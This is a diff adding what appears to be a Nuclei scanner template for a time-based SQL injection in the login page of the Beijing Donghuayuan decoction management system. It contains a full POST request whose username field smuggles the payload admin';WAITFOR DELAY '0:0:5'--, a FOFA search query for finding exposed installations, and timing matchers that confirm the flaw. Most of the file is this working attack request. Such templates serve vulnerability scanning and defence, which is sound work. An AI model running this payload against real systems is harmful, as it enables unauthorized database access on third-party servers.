@@ -1,0 +1,38 @@
+id: donghuayuan-login-sqli
+info:
+  name: 北京东华原煎药管理系统前台存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59545/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: body="北京东华原煎药管理系统"
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,donghuayuan
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /login.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2742.29 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 343
+        Connection: close
+
+        __VIEWSTATE=%2FwEPDwUKLTUwOTQ0NDQ3MWRkpgdsi8t2Mpk2etkPTx4dYYLWqCgu%2FxH2%2BSt7PujLq64%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAARwJ6xNw95zeL4t2WXovB5lY3plgk0YBAefRz3MyBlTcE5Fo5u8Nmrtdka2GVrCes2inihG6d%2FXh3PZm3b5AoMQd2u8tes2WA%2BdOem8kT6x%2BfxKMf1BxSTB7qkCSortUm0%3D&txtUserName=admin%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&txtUserPwd=123&btnLogin=%E7%99%BB%E5%BD%95
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
